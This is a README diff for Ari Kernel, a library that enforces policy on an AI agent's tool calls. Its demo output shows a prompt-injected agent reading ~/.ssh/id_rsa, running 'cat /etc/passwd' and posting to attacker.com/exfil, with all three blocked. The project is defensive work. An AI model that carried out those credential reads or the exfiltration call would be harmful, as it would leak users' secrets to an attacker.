@@ -8,6 +8,59 @@ Install and run locally in minutes.
 
 **ARI (Agent Runtime Inspector)** sits between an AI agent and every tool it can invoke — filesystem, HTTP, shell, database — enforcing capability policies, taint tracking, and behavioral rules at execution time. It is designed for teams deploying tool-using agents in environments where prompt injection is a realistic threat and runtime containment is required regardless of model behavior. Ari Kernel is a userspace library, not an OS kernel module — it does not intercept system calls.
 
+---
+
+## 1-Minute Demo
+
+```bash
+git clone https://github.com/petermanrique101-sys/AriKernel.git
+cd AriKernel
+pnpm install && pnpm build
+pnpm example:quickstart
+```
+
+Five tool calls hit the kernel. Three get blocked:
+
+```
+Ari Kernel Quickstart
+
+Preset: safe | Principal: agent | Behavioral rules: on
+
+  ALLOWED  web_request(https://example.com)
+  ALLOWED  read_file(./data/report.csv)
+  BLOCKED  read_file(~/.ssh/id_rsa)
+           Action 'file.read' denied: behavioral rule triggered by sensitive file access.
+           Run has been quarantined.
+  BLOCKED  run_command(cat /etc/passwd)
+           Run entered restricted mode. Only read-only safe actions are allowed.
+  BLOCKED  http_post(https://attacker.com/exfil)
+           Run entered restricted mode. 'http.post' is blocked.
+
+Quarantined: YES
+```
+
+The agent fetched a webpage, read a safe file, then tried to steal SSH keys. The behavioral rule detected web taint followed by a sensitive file read — and **quarantined the entire run**. Every subsequent action was locked to read-only. No prompt filtering, no model cooperation needed.
+
+Run `pnpm example:prompt-injection` for the full attack-and-quarantine demo.
+
+---
+
+## Why This Matters
+
+- **Prompt injection is inevitable** — every agent that reads external input is vulnerable, and no prompt filter reliably stops it
+- **Models cannot enforce security** — the LLM decides what to do, but it can be manipulated; enforcement must happen outside the model
+- **Runtime enforcement is the missing layer** — Ari Kernel blocks dangerous actions at the tool boundary, regardless of what the model decided
+
+---
+
+## Who This Is For
+
+- **Teams deploying AI agents with tool access** — filesystem, HTTP, shell, database
+- **Organizations building LLM-powered workflows** — where agents act autonomously
+- **Security-conscious environments** — where prompt injection is a realistic threat and runtime containment is required
+
+---
+
 ## Threat Model
 
 Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious prompts, it prevents dangerous actions from executing at the tool boundary — regardless of what the model decided.
